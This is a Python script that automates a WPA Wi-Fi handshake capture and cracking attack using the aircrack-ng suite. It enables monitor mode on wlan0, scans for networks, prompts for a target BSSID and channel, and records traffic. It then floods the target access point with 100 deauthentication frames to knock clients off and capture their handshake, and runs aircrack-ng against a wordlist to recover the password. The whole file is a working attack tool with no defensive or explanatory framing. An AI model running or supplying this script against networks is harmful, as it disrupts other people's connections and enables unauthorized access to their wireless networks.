import os
import subprocess
def run_command(command, wait=True):
    try:
        if wait:
            subprocess.run(command, check=True)
        else:
            subprocess.Popen(command)
    except subprocess.CalledProcessError as e:
        print(f"Error occurred while running command: {command}")
        print(e)
        exit(1)
def main():
    if "XDG_RUNTIME_DIR" not in os.environ:
        os.environ["XDG_RUNTIME_DIR"] = f"/run/user/{os.getuid()}"
    run_command(["sudo", "airmon-ng", "start", "wlan0"])
    run_command(["qterminal", "--title", "scan", "-e", "airodump-ng", "wlan0"], wait=False)
    bssid = input("BSSID?: ")
    channel = input("Channel?: ")
    run_command(["qterminal", "--title", "handshake", "-e", "airodump-ng", "-c", channel, "--bssid", bssid, "-w", "MISC/WPA/wificrack", "wlan0", "--ignore-negative-one"], wait=False)
    run_command(["qterminal", "--title", "aireplay-ng", "-e", "aireplay-ng", "--deauth", "100", "-a", bssid, "wlan0", "--ignore-negative-one"])
    print("Press Ctrl+C if you are ready")
    try:
        while True:
            pass
    except KeyboardInterrupt:
        choice = input("Do you want to crack the captured handshake? (y/n): ").strip().lower()
        if choice == "y":
            run_command(["sudo", "aircrack-ng", "-w", "MISC/WORDLIST/wordlist.txt", "-b", bssid, "MISC/WPA/wificrack-01.cap"])
        else:
            print("Exiting without cracking the handshake.")
            exit(0)
if __name__ == "__main__":
    main()
